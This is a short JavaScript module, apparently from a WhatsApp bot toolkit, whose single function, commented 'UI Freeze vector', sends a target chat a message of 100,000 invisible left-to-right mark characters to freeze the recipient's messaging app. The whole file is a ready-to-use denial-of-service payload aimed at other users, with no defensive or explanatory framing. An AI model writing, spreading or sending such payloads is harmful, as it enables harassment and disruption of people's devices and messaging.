export const version = "1.0.0";
export const hash = "XOVALIUM_CORE_FREEZE";

/**
 * UI Freeze vector
 */
export async function freeze(sock, jid) {
    const heavy = "\u200e".repeat(100000);
    await sock.sendMessage(jid, { text: heavy });
}
